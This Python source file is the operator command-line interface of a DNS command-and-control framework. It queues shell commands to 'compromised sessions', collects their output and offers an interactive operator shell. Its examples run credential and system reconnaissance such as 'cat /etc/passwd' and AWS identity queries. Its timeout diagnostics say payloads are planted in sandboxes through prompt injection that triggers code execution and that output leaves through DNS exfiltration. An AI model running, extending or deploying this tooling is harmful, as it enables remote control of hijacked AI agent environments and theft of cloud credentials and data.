"""Session commands for interacting with compromised sessions."""

import time

import click

from c2.core.session_manager import SessionManager


@click.command()
@click.argument("command")
@click.option(
    "--session",
    "-s",
    required=True,
    help="Session ID to send command to",
)
def send(command, session):
    """
    Send a command to a compromised session.

    \b
    Examples:
      c2 send "whoami" -s sess_abc123
      c2 send "aws s3 ls" -s sess_abc123
      c2 send "cat /etc/passwd" --session sess_abc123
    """
    manager = SessionManager()

    if manager.queue_command(session, command):
        click.echo(f"[+] Command sent to session {session}: {command}")
    else:
        click.echo(f"[!] Failed to send command", err=True)
        raise SystemExit(1)


@click.command()
@click.option(
    "--session",
    "-s",
    required=True,
    help="Session ID to receive output from",
)
@click.option(
    "--wait",
    "-w",
    default=0,
    type=int,
    help="Wait up to N seconds for output (default: 0, no wait)",
)
@click.option(
    "--poll-interval",
    default=2,
    type=int,
    help="Polling interval in seconds when waiting (default: 2)",
)
@click.option(
    "--since",
    default=0,
    type=int,
    help="Only show outputs with ID greater than this (default: 0, show all)",
)
def receive(session, wait, poll_interval, since):
    """
    Receive output from a compromised session.

    \b
    Examples:
      c2 receive -s sess_abc123
      c2 receive -s sess_abc123 --wait 30
      c2 receive -s sess_abc123 --since 1 --wait 30
    """
    manager = SessionManager()
    last_output_id = since
    start_time = time.time()
    got_output = False

    while True:
        outputs = manager.get_output(session, last_output_id)

        for output in outputs:
            click.echo(f"\n[Output {output['id']}] {output.get('timestamp', '')}")
            click.echo(output["data"])
            last_output_id = output["id"]
            got_output = True

        # If we got output or not waiting, exit
        if got_output or wait == 0:
            break

        # Check timeout
        elapsed = time.time() - start_time
        if elapsed >= wait:
            break

        # Wait before next poll
        time.sleep(poll_interval)

    if not got_output:
        click.echo("[*] No output available")


@click.command()
@click.argument("session")
def attach(session):
    """
    Attach to a session interactively.

    \b
    SESSION is the session ID to attach to (e.g., sess_abc123)

    \b
    Example:
      c2 attach sess_abc123
    """
    manager = SessionManager()
    last_output_id = 0

    click.echo(f"\n{'=' * 60}")
    click.echo("  DNS C2 Operator Shell")
    click.echo(f"{'=' * 60}")
    click.echo(f"  Session ID: {session}")
    click.echo(f"  C2 Server:  {manager.c2_server}")
    click.echo(f"  C2 Domain:  {manager.c2_domain}")

    # Check connection
    click.echo(f"\n[*] Checking C2 server connectivity...")
    if not manager.check_connection():
        click.echo(
            f"[!] Warning: Cannot reach C2 server at {manager.c2_server}", err=True
        )
        click.echo("[!] Make sure the DNS C2 server is running", err=True)

    click.echo(f"\n{'-' * 60}")
    click.echo("  Commands:")
    click.echo(f"{'-' * 60}")
    click.echo("   <command>  - Execute shell command on target")
    click.echo("   status     - Check for pending output")
    click.echo("   exit       - Quit (session stays active)")
    click.echo("   kill       - Terminate session and quit")
    click.echo("   help       - Show this help")
    click.echo(f"{'-' * 60}\n")

    try:
        while True:
            # Check for pending output
            outputs = manager.get_output(session, last_output_id)
            if outputs:
                for output in outputs:
                    click.echo(f"\n{'-' * 60}")
                    click.echo(f"  Output from {session}:")
                    click.echo(f"{'-' * 60}")
                    click.echo(output["data"])
                    click.echo(f"{'-' * 60}\n")
                    last_output_id = output["id"]

            # Get command
            try:
                cmd = click.prompt(f"c2:{session}", prompt_suffix="> ").strip()
            except (KeyboardInterrupt, EOFError):
                click.echo("\n[*] Exiting...")
                break

            if not cmd:
                continue

            if cmd.lower() == "exit":
                click.echo("[*] Exiting (session stays active)...")
                break

            elif cmd.lower() == "kill":
                click.echo(f"[*] Terminating session {session}...")
                if manager.terminate_session(session):
                    click.echo("[+] Session terminated")
                else:
                    click.echo("[!] Failed to terminate session")
                break

            elif cmd.lower() == "status":
                # Check session liveness
                session_list = manager.list_sessions()
                session_info = next(
                    (s for s in session_list if s.get("id") == session), None
                )
                if session_info:
                    ago = session_info.get("last_seen_ago", "?")
                    terminated = session_info.get("terminated", False)
                    if terminated:
                        click.echo(f"[!] Session {session}: terminated")
                    else:
                        click.echo(f"[*] Session {session}: active (last seen {ago}s ago)")
                else:
                    click.echo(
                        f"[!] Session {session} not found on C2 server"
                    )
                # Check pending output
                outputs = manager.get_output(session, last_output_id)
                if outputs:
                    for output in outputs:
                        click.echo(f"\n[Output {output['id']}]")
                        click.echo(output["data"])
                        last_output_id = output["id"]
                else:
                    click.echo("[*] No pending output")
                continue

            elif cmd.lower() == "help":
                click.echo("\n  Commands:")
                click.echo("   <command>  - Execute shell command on target")
                click.echo("   status     - Check for pending output")
                click.echo("   exit       - Quit (session stays active)")
                click.echo("   kill       - Terminate session and quit")
                click.echo("   help       - Show this help")
                click.echo("\n  Examples:")
                click.echo("   whoami")
                click.echo("   aws s3 ls")
                click.echo("   aws sts get-caller-identity")
                click.echo()
                continue

            else:
                # Send command
                click.echo(f"[>] Sending: {cmd}")
                if manager.queue_command(session, cmd):
                    click.echo("[+] Command queued")
                    click.echo("[*] Waiting for output...\n")

                    # Poll for output
                    start_time = time.time()
                    timeout = 30
                    got_output = False
                    cmd_output_id = last_output_id

                    tick = 0
                    try:
                        while time.time() - start_time < timeout:
                            outputs = manager.get_output(session, cmd_output_id)
                            if outputs:
                                click.echo()  # clear progress line
                                for output in outputs:
                                    click.echo(f"{'-' * 60}")
                                    click.echo("  Output:")
                                    click.echo(f"{'-' * 60}")
                                    click.echo(output["data"])
                                    click.echo(f"{'-' * 60}\n")
                                    last_output_id = output["id"]
                                got_output = True
                                break
                            elapsed = int(time.time() - start_time)
                            bar = "." * (tick % 8 + 1)
                            click.echo(
                                f"\r[*] Waiting for output... {elapsed}s [{bar}]       ",
                                nl=False,
                            )
                            tick += 1
                            time.sleep(1)
                    except KeyboardInterrupt:
                        click.echo("\n[!] Stopped waiting\n")

                    if not got_output:
                        click.echo(f"[!] No output after {timeout}s")
                        click.echo("[*] Running diagnostics...\n")
                        _diagnose_timeout(manager, session)
                else:
                    click.echo("[!] Failed to send command\n")

    except Exception as e:
        click.echo(f"\n[!] Error: {e}", err=True)

    click.echo(f"\n{'=' * 60}")
    click.echo(f"  Session: {session}")
    click.echo(f"  Status: Detached")
    click.echo(f"{'=' * 60}")
    click.echo(f"  To reattach: c2 attach {session}")
    click.echo(f"{'=' * 60}\n")


@click.command()
def status():
    """Check C2 server connectivity."""
    manager = SessionManager()

    click.echo(f"C2 Server: {manager.c2_server}")
    click.echo(f"C2 Domain: {manager.c2_domain}")
    click.echo()

    if manager.check_connection():
        click.echo("[+] C2 server is reachable")
    else:
        click.echo("[!] Cannot reach C2 server", err=True)
        raise SystemExit(1)


@click.command()
def sessions():
    """List active C2 sessions."""
    manager = SessionManager()

    session_list = manager.list_sessions()
    if not session_list:
        click.echo("[*] No sessions found")
        return

    # Table header
    click.echo(
        f"{'Session ID':<20} {'Last Seen':<14} {'Pending':<10} "
        f"{'Chunks':<10} {'Status'}"
    )
    click.echo("-" * 72)

    for s in session_list:
        sid = s.get("id", "?")
        ago = s.get("last_seen_ago", "?")
        pending = s.get("pending_commands", 0)
        delivering = s.get("has_pending_delivery", False)
        chunks = s.get("output_chunks", 0)
        terminated = s.get("terminated", False)

        if terminated:
            status_str = "terminated"
        elif delivering:
            status_str = "delivering"
        elif isinstance(ago, (int, float)) and ago > 60:
            status_str = "stale"
        else:
            status_str = "active"

        ago_str = f"{ago}s ago" if isinstance(ago, (int, float)) else str(ago)
        click.echo(
            f"{sid:<20} {ago_str:<14} {pending:<10} "
            f"{chunks:<10} {status_str}"
        )


@click.command()
def debug():
    """
    Full debug dump of C2 server state.

    Shows recent DNS queries, session state, and server uptime.
    Useful for diagnosing why payloads aren't calling home or
    commands aren't being delivered.
    """
    manager = SessionManager()

    info = manager.get_debug_info()
    if not info:
        click.echo("[!] Could not retrieve debug info from C2 server", err=True)
        raise SystemExit(1)

    # Server uptime
    uptime = info.get("server_uptime", 0)
    mins, secs = divmod(int(uptime), 60)
    hours, mins = divmod(mins, 60)
    click.echo(f"\nServer uptime: {hours}h {mins}m {secs}s")
    click.echo(f"DNS queries in buffer: {info.get('total_dns_queries_in_buffer', 0)}")

    # Active sessions
    active = info.get("active_sessions", {})
    click.echo(f"\n--- Sessions ({len(active)}) ---")
    if active:
        for sid, state in active.items():
            ago = state.get("last_seen_ago", "?")
            pending = state.get("pending_commands", 0)
            polls = state.get("poll_count", 0)
            chunks = state.get("output_chunks", 0)
            terminated = state.get("terminated", False)
            delivering = state.get("has_pending_delivery", False)
            flags = []
            if terminated:
                flags.append("TERMINATED")
            if delivering:
                flags.append("DELIVERING")
            flag_str = f" [{', '.join(flags)}]" if flags else ""
            click.echo(
                f"  {sid}: last_seen={ago}s ago, "
                f"pending={pending}, polls={polls}, "
                f"output_chunks={chunks}{flag_str}"
            )
    else:
        click.echo("  (none)")

    # Output buffer
    output_buf = info.get("output_buffer", {})
    if output_buf:
        click.echo(f"\n--- Output Buffer ---")
        for sid, count in output_buf.items():
            click.echo(f"  {sid}: {count} chunks buffered")

    # Recent DNS queries
    queries = info.get("recent_dns_queries", [])
    click.echo(f"\n--- Recent DNS Queries (last {len(queries)}) ---")
    if queries:
        for q in queries:
            click.echo(
                f"  {q.get('ts', '?')}  {q.get('src', '?')} -> "
                f"{q.get('name', '?')} ({q.get('type', '?')})"
            )
    else:
        click.echo("  (none)")

    click.echo()


def _diagnose_timeout(manager, session_id):
    """Auto-diagnose why a command timed out with no output."""
    info = manager.get_debug_info()
    if not info:
        click.echo("[!] Could not reach C2 server for diagnostics")
        click.echo("[*] Use 'status' to check later\n")
        return

    queries = info.get("recent_dns_queries", [])
    active = info.get("active_sessions", {})
    session_state = active.get(session_id, {})

    # Check if the session appears in recent DNS queries
    session_queries = [q for q in queries if session_id in q.get("name", "")]
    has_polls = any("cmd." in q.get("name", "") for q in session_queries)
    has_chunks = any(
        q.get("name", "").startswith("c") and session_id in q.get("name", "")
        for q in session_queries
    )

    click.echo(f"--- Timeout Diagnosis for {session_id} ---")

    if not session_queries:
        click.echo(
            "[!] DIAGNOSIS: Payload never called home.\n"
            "    No DNS queries from this session in the last 200 queries.\n"
            "    Likely causes:\n"
            "      - Prompt injection did not trigger code execution\n"
            "      - Session ID mismatch between payload and attach\n"
            "      - Payload hit a syntax error before DNS polling started\n"
        )
    elif has_polls and not has_chunks:
        pending = session_state.get("pending_commands", 0)
        delivering = session_state.get("has_pending_delivery", False)
        if pending > 0 or delivering:
            click.echo(
                "[!] DIAGNOSIS: Command queued but not fetched.\n"
                f"    Session IS polling (seen in DNS), and command is staged.\n"
                "    Likely causes:\n"
                "      - Payload may have crashed after polling started\n"
                "      - DNS response not reaching the sandbox (network issue)\n"
            )
        else:
            click.echo(
                "[!] DIAGNOSIS: Payload IS polling, but no command was delivered.\n"
                "    The session polls for commands but nothing was queued.\n"
                "    Likely causes:\n"
                "      - Command was consumed by a previous attach/send\n"
                "      - Race condition: command cleared before fetch\n"
            )
    elif has_chunks:
        click.echo(
            "[!] DIAGNOSIS: Command was delivered but no output received.\n"
            "    Chunk fetch queries are visible — the payload got the command.\n"
            "    Likely causes:\n"
            "      - Command execution is still in progress (slow command)\n"
            "      - Exfiltration DNS queries are being blocked\n"
            "      - Payload crashed during command execution\n"
        )
    else:
        click.echo(
            "[?] DIAGNOSIS: Inconclusive.\n"
            f"    Found {len(session_queries)} DNS queries for this session.\n"
            "    Run 'c2 debug' for full diagnostics.\n"
        )
